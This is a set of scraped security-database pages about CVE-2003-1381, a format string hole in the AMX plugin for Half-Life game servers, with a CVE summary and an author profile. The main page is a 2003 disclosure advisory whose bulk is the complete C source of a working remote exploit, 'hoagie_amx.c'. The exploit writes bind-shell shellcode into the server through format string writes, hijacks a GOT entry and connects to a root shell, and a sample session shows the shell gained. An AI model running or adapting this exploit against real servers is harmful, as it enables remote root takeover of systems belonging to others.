=== Content from securityreason.com_251763c1_20250125_154534.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Half-Life AMX-Mod remote (root) hole** **2007.10.20** Credit:  **[greuff](https://cxsecurity.com/author/greuff/1/)**  Risk: **High** Local: **No** Remote: ****Yes**** CVE: **[CVE-2003-1381](https://cxsecurity.com/cveshow/CVE-2003-1381/ "Click to see CVE-2003-1381")** CWE: **N/A** CVSS Base Score: **6.8/10** Impact Subscore: **6.4/10** Exploitability Subscore: **8.6/10** Exploit range: **Remote** Attack complexity: **Medium** Authentication: **No required** Confidentiality impact: **Partial** Integrity impact: **Partial** Availability impact: **Partial** | | --- | |
| --- | --- | --- | --- |

[void.at Security Advisory VSA0308 - mailto:crew at void dot at]
AMX[1] is a plugin for the "Half-Life Server", hosting
the most popular online game today, "Counter-Strike", among
others.
Overview
========
Due to a format string bug in AMX, it is possible
for a remote attacker who knows the rcon-password to
remotely exploit the gameserver. Since most game-server-
admins I've seen are not very security-aware, the server
generally runs as root.
The rcon-password can be obtained using social engineering
or sniffing-techniques, since it is being transmitted
in plaintext. It is needed because the vulnerable function
can only be called via rcon.
Affected Versions
=================
All AMX versions <= 0.9.2 on Windows and Linux.
Successfully tested with AMX 0.9.2 running on
hlds 3.1.1.0 on Linux.
Impact
======
High. Remote-shell and very likely remote-root.
Details
=======
This is a format string bug in the "amx\_say"-command.
I can't provide a code snipplet since this plugin is
closed source. A word to the AMX-Team: closed source
doesn't protect you against security bugs!
rcon-output:
log on
amx\_say %08x.%08x
(ALL) hoschLAN CS 1.5 ~~ Public ~~ : %08x.%08x
L 02/26/2003 - 18:39:09: Chat: "hoschLAN CS 1.5 ~~ Public ~~
<0><><>" say "%08x.%08x"
L 02/26/2003 - 18:39:09: "hoschLAN CS 1.5 ~~ Public ~~
<0><><>" triggered "amx\_say" (text "00000006.bffff258")
Solution
========
Disable AMX until a patched version becomes available.
Change the rcon-password.
Exploit
=======
Please find attached a demonstration exploit. Note that it will
only work against a Linux-server due to the exploitation technique.
This does NOT mean that Windows-servers are not vulnerable, they
still suffer from the same hole.
Sample exploitation session
===========================
greuff@saturn:~$ ./hoagie\_amx localhost 27015 myprecious
hoagie\_amx - remote exploit for hlds servers using the amx plugin
by greuff (at) void (dot) at [email concealed]
Getting stackpop count....
Stackpops found: 118, Padding: 1
Writing shellcode.....
Connecting to the shell...
Connect to the shell
id
uid=0(root) gid=0(root) groups=0(root),101(lpadmin)
exit
Discovered by
=============
greuff <greuff (at) void (dot) at [email concealed]>
Timeline
========
02-11-2003: informed djeyl (at) djeyl (dot) net [email concealed] about the issue (AMX-developer)
gave 14 days to release patched version to the public
02-16-2003: olo (at) counter-strike (dot) pl [email concealed] sent me a patched AMX version
02-20-2003: confirmed that patched AMX version closes the hole
02-25-2003: 14 days over: AMX-developers still didn't release a
fixed version
02-26-2003: public disclosure
Credits
=======
void.at
everyone who was at 19c3
References
==========
[1] http://www.amxmod.net
==================================================================
/\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\* hoagie\_amx.c
\*
\* Remote exploit for Halflife-Servers running the AMX-Plugin
\* (rcon-password required)
\*
\* Binds a shell to port 30464/tcp and connects to it.
\*
\* Author: greuff (at) void (dot) at [email concealed]
\*
\* Tested with HL-Server v3.1.1.0 and AMX 0.9.2 on Linux
\*
\* Credits:
\* void.at
\* Taeho Oh for using parts of his shellcode-connection code.
\*
\* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-CONCEPT.
\* THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY DAMAGE OR
\* CRIMINAL ACTIVITIES DONE USING THIS PROGRAM.
\*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*/
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <stdlib.h>
#define VSNPRINTF\_GOT\_ADDRESS 0x0804ce18
#define OFFSET 0x41414141
#define SB4(a) ((unsigned int)(a>>24))
#define SB3(a) ((unsigned int)((a>>16)&0xFF))
#define SB2(a) ((unsigned int)((a>>8)&0xFF))
#define SB1(a) ((unsigned int)(a&0XFF))
// forks and binds a shell to 30464/tcp. parent process exit()s.
char shellcode[] = "\x31\xc0\x40\x40\xcd\x80\x89\xc0\x85\xc0\x74\x06"
"\x31\xc0\xb0\x01\xcd\x80"
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51"
"\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51\x8d\x0c\x24\xcd"
"\x80\xb3\x02\xb1\x02\x31\xc9\x51\x51\x51\x80\xc1\x77"
"\x66\x51\xb1\x02\x66\x51\x8d\x0c\x24\xb2\x10\x52\x51"
"\x50\x8d\x0c\x24\x89\xc2\x31\xc0\xb0\x66\xcd\x80\xb3"
"\x01\x53\x52\x8d\x0c\x24\x31\xc0\xb0\x66\x80\xc3\x03"
"\xcd\x80\x31\xc0\x50\x50\x52\x8d\x0c\x24\xb3\x05\xb0"
"\x66\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80"
"\x41\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd"
"\x80\x31\xdb\x53\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
"\x69\x89\xe3\x8d\x54\x24\x08\x31\xc9\x51\x53\x8d\x0c"
"\x24\x31\xc0\xb0\x0b\xcd\x80"
"\x31\xc0\xb0\x01\xcd\x80";
char server\_ip[20];
char rcon\_pwd[30];
int server\_port;
int exec\_sh(int sockfd)
{
char snd[4096],rcv[4096];
fd\_set rset;
while(1)
{
FD\_ZERO(&rset);
FD\_SET(fileno(stdin),&rset);
FD\_SET(sockfd,&rset);
select(255,&rset,NULL,NULL,NULL);
if(FD\_ISSET(fileno(stdin),&rset))
{
memset(snd,0,sizeof(snd));
fgets(snd,sizeof(snd),stdin);
write(sockfd,snd,strlen(snd));
}
if(FD\_ISSET(sockfd,&rset))
{
memset(rcv,0,sizeof(rcv));
if(read(sockfd,rcv,sizeof(rcv))<=0)
exit(0);
fputs(rcv,stdout);
}
}
}
int connect\_sh()
{
int sockfd,i;
struct sockaddr\_in sin;
struct hostent \*he;
printf("Connect to the shell\n");
fflush(stdout);
memset(&sin,0,sizeof(sin));
sin.sin\_family=AF\_INET;
sin.sin\_port=htons(30464);
if((he=gethostbyname(server\_ip))<0) perror("gethostbyname"), exit(1);
memcpy(&sin.sin\_addr,\*(he->h\_addr\_list),sizeof(sin.sin\_addr));
if((sockfd=socket(AF\_INET,SOCK\_STREAM,0))<0)
{
printf("Can't create socket\n");
exit(0);
}
if(connect(sockfd,(struct sockaddr \*)&sin,sizeof(sin))<0)
{
printf("Can't connect to the shell\n");
exit(0);
}
return sockfd;
}
void create\_conn(int \*sock, char \*host, int port)
{
struct sockaddr\_in sin;
struct timeval timeout;
struct hostent \*he;
sin.sin\_family=AF\_INET;
sin.sin\_port=htons(port);
if((he=gethostbyname(host))<0) perror("gethostbyname"), exit(1);
memcpy(&sin.sin\_addr,\*(he->h\_addr\_list),sizeof(sin.sin\_addr));
if((\*sock=socket(PF\_INET,SOCK\_DGRAM,0))<0) perror("socket"), exit(1);
timeout.tv\_sec=10;
timeout.tv\_usec=0;
if(setsockopt(\*sock,SOL\_SOCKET,SO\_RCVTIMEO,(const void \*)&timeout,
sizeof(timeout))<0)
perror("setsockopt"),exit(1);
if(setsockopt(\*sock,SOL\_SOCKET,SO\_SNDTIMEO,(const void \*)&timeout,
sizeof(timeout))<0)
perror("setsockopt"),exit(1);
}
void lowlevel\_rcon(int sock, char \*host, int port, char \*cmd, char \*reply)
{
char msg[2000];
struct sockaddr\_in sin;
struct sockaddr\_in sfrom;
struct hostent \*he;
fd\_set fdset;
int dummy;
usleep(100);
sin.sin\_family=AF\_INET;
sin.sin\_port=htons(port);
if((he=gethostbyname(host))<0) perror("gethostbyname"), exit(1);
memcpy(&sin.sin\_addr,\*(he->h\_addr\_list),sizeof(sin.sin\_addr));
sprintf(msg,"%c%c%c%c%s",0xff,0xff,0xff,0xff,cmd);
if(sendto(sock,msg,strlen(msg),0,(struct sockaddr \*)&sin,sizeof(sin))<0)
perror("sendto"), exit(1);
if(reply)
{
if(recvfrom(sock,msg,2000,0,(struct sockaddr \*)&sfrom,&dummy)<0)
{
if(errno==EAGAIN)
{
// resend message
printf("msg stalled, resending...\n");
sprintf(msg,"%c%c%c%c%s",0xff,0xff,0xff,0xff,cmd);
if(sendto(sock,msg,strlen(msg),0,(struct sockaddr
\*)&sin,sizeof(sin))<0)
perror("sendto"), exit(1);
else
printf("resend OK\n");
if(recvfrom(sock,msg,2000,0,(struct sockaddr \*)&sfrom,&dummy)<0)
perror("recvfrom"),exit(1);
}
else
perror("recvfrom"), exit(1);
}
if(strncmp(msg,"\xFF\xFF\xFF\xFF",4))
fprintf(stderr,"protocol error: reply\n"), exit(1);
strcpy(reply,msg+4);
}
}
void send\_rcon(int sock, char \*host, int port, char \*rconpwd, char \*cmd, char
\*reply\_fun)
{
char reply[1000];
char msg[2000];
lowlevel\_rcon(sock,host,port,"challenge rcon",reply);
if(!strstr(reply,"challenge rcon "))
fprintf(stderr,"protocol error\n"), exit(1);
reply[strlen(reply)-1]=0;
sprintf(msg,"rcon %s \"%s\" %s",reply+strlen("challenge rcon
"),rconpwd,cmd);
if(reply\_fun)
lowlevel\_rcon(sock,host,port,msg,reply);
else
lowlevel\_rcon(sock,host,port,msg,NULL);
if(reply\_fun)
strcpy(reply\_fun,reply);
}
int get\_padding(unsigned char c,int bytes\_written)
{
int write\_byte=c;
int already\_written=bytes\_written;
int padding;
write\_byte+=0x100;
already\_written%=0x100;
padding=(write\_byte-already\_written)%0x100;
if(padding<10) padding+=0x100;
return padding;
}
void get\_write\_paddings(unsigned long addr, int \*p1, int \*p2, int \*p3,
int \*p4, int bytes\_written)
{
// greetings to scud :-)
int write\_byte;
int already\_written;
int padding;
write\_byte=SB1(addr);
already\_written=bytes\_written;
write\_byte+=0x100;
already\_written%=0x100;
padding=(write\_byte-already\_written)%0x100;
if(padding<10) padding+=0x100;
\*p1=padding;
write\_byte=SB2(addr);
already\_written+=padding;
write\_byte+=0x100;
already\_written%=0x100;
padding=(write\_byte-already\_written)%0x100;
if(padding<10) padding+=0x100;
\*p2=padding;
write\_byte=SB3(addr);
already\_written+=padding;
write\_byte+=0x100;
already\_written%=0x100;
padding=(write\_byte-already\_written)%0x100;
if(padding<10) padding+=0x100;
\*p3=padding;
write\_byte=SB4(addr);
already\_written+=padding;
write\_byte+=0x100;
already\_written%=0x100;
padding=(write\_byte-already\_written)%0x100;
if(padding<10) padding+=0x100;
\*p4=padding;
}
int main(int argc, char \*\*argv)
{
int sock, stackpops, padding;
int i,j,bytes\_written;
int p1,p2,p3,p4;
char cmd[1000], reply[1000];
unsigned long addr;
printf("hoagie\_amx - remote exploit for hlds servers using the amx
plugin\n"
"by greuff (at) void (dot) at [email concealed]\n\n");
if(argc!=4)
{
printf("Usage: %s server\_name server\_port rcon\_password\n\n",argv[0]);
exit(1);
}
strcpy(server\_ip,argv[1]);
server\_port=strtol(argv[2],NULL,10);
strcpy(rcon\_pwd,argv[3]);
create\_conn(&sock,server\_ip,server\_port);
printf("Getting stackpop count...");
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,"log on",reply);
stackpops=-1;
for(padding=0;padding<4 && stackpops==-1;padding++)
{
for(i=50;i<200 && stackpops==-1;i++)
{
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
sprintf(reply,"AAAA%%%d$08x",i);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,reply);
reply[strlen(reply)-1]=0;
if(strstr(reply,"AAAA41414141"))
{
char \*ptr;
ptr=strrchr(reply,'\n')+1; // get pointer to last log line
stackpops=i;
bytes\_written=strstr(ptr," (text \"")+strlen(" (text
\"")-strchr(ptr,'\"');
bytes\_written+=4+padding;
}
printf(".");
fflush(stdout);
}
}
padding--;
if(stackpops==-1)
{
printf("\ncouldn't determine stackpop count. (I really tried hard!)\n");
exit(1);
}
printf("\nStackpops found: %d, Padding: %d\n",stackpops,padding);
// inject shellcode
printf("Writing shellcode...");
addr=OFFSET;
for(i=0;i<strlen(shellcode);)
{
int t;
if((addr&0xFF)>0x75)
{
// leave space for jmp-instruction (5 bytes: 0xe9 offset/32)
// distance is 0x13B-0x7A = 193d
unsigned long target=192;
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
t=get\_padding(0xe9,bytes\_written);
sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
(addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,reply);
addr++;
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
t=get\_padding(target&0xFF,bytes\_written);
sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
(addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,reply);
addr++;
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
t=get\_padding((target>>8)&0xFF,bytes\_written);
sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
(addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,reply);
addr++;
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
t=get\_padding((target>>16)&0xFF,bytes\_written);
sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
(addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,reply);
addr++;
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
t=get\_padding((target>>24)&0xFF,bytes\_written);
sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
(addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,reply);
addr+=193;
}
else
{
// write shellcode-pieces
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
t=get\_padding(shellcode[i],bytes\_written);
sprintf(reply,"%c%c%c%c%%%du%%%d$n",addr&0xFF,(addr>>8)&0xFF,
(addr>>16)&0xFF,(addr>>24)&0xFF,t,stackpops);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,reply);
addr++;
i++;
}
printf(".");
fflush(stdout);
}
// overwrite GOT entry with shellcode address
strcpy(cmd,"amx\_say ");
for(j=0;j<padding;j++) strcat(cmd,"b");
get\_write\_paddings(OFFSET,&p1,&p2,&p3,&p4,bytes\_written+24+padding\*4);
addr=VSNPRINTF\_GOT\_ADDRESS;
sprintf(reply,"%c%c%c%cAAAA%c%c%c%cAAAA%c%c%c%cAAAA%c%c%c%cAAAA"
"%%%du%%%d$n%%%du%%%d$n%%%du%%%d$n%%%du%%%d$n",
addr&0xFF,(addr>>8)&0xFF,(addr>>16)&0xFF,(addr>>24)&0xFF,
(addr+1)&0xFF,((addr+1)>>8)&0xFF,((addr+1)>>16)&0xFF,((addr+1)>>24)&0xFF
,
(addr+2)&0xFF,((addr+2)>>8)&0xFF,((addr+2)>>16)&0xFF,((addr+2)>>24)&0xFF
,
(addr+3)&0xFF,((addr+3)>>8)&0xFF,((addr+3)>>16)&0xFF,((addr+3)>>24)&0xFF
,
p1,stackpops,p2,stackpops+2,p3,stackpops+4,p4,stackpops+6);
strcat(cmd,reply);
send\_rcon(sock,server\_ip,server\_port,rcon\_pwd,cmd,NULL);
sleep(1);
close(sock);
printf("\nConnecting to the shell...\n");
exec\_sh(connect\_sh());
return 0;
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007100079)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_18ea9aa6_20250126_100124.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Vulnerability **CVE-2003-1381**** **Published:** 2003-12-31   **Modified:** 2012-02-12 | ***Description:*** | | --- | | Format string vulnerability in AMX 0.9.2 and earlier, a plugin for Valve Software's Half-Life Server, allows remote attackers to execute arbitrary commands via format string specifiers in the amx\_say command. |  See advisories in our WLB2 database:  |  | **Topic** | **Author** | **Date** | | --- | --- | --- | --- | | High | [Half-Life AMX-Mod remote (root) hole](https://cxsecurity.com/issue/WLB-2007100079 "Half-Life AMX-Mod remote (root) hole") | greuff | 20.10.2007 |   [**CVSS2**](http://nvd.nist.gov/cvss.cfm?version=2&vector=(AV:N/AC:M/Au:N/C:P/I:P/A:P) "NVD CVSS2") => (AV:N/AC:M/Au:N/C:P/I:P/A:P)  | **CVSS Base Score** | **Impact Subscore** | **Exploitability Subscore** | | --- | --- | --- | | 6.8/10 | 6.4/10 | 8.6/10 |  | **Exploit range** | **Attack complexity** | **Authentication** | | --- | --- | --- | | Remote | Medium | No required | | **Confidentiality impact** | **Integrity impact** | **Availability impact** | | Partial | Partial | Partial |  | **Affected software** | | | --- | --- | | [Amxmod.net](https://cxsecurity.com//cvevendor/1949/amxmod_2e_net/ "Vendor List")  **->**  [Amx mod](https://cxsecurity.com/cveproduct/1949/3191/amx_mod/ "All issues to this product") |   |  | | --- |  | References: | | --- | | http://securityreason.com/securityalert/3258 http://www.securityfocus.com/archive/1/313273 http://www.securityfocus.com/bid/6968 https://exchange.xforce.ibmcloud.com/vulnerabilities/11427 | | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | |  |    closedb(); ?  ---   Copyright **2025**, cxsecurity.com |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

Back to Top



=== Content from cxsecurity.com_dd2a0abe_20250126_100124.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | Author: greuff [**Country:**](https://cxsecurity.com/best/XX/ "Hackers from xx") Reported research: 1 | | --- | |  |  | Advisories | | --- |  | Risk | Topic & Details | | --- | --- | | High | [Half-Life AMX-Mod remote (root) hole](https://cxsecurity.com/issue/WLB-2007100079 "Half-Life AMX-Mod remote (root) hole") (CVE assigned)Remote **|** 2007-10-20 |  Do you know.. we can display your:- Twitter Link - Website Link - Zone-H Link - Description of profile - email (let us know if you want show public) Let's us know! submit@cxsec.org  ---   Copyright **2025**, cxsecurity.com |  |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

Back to Top


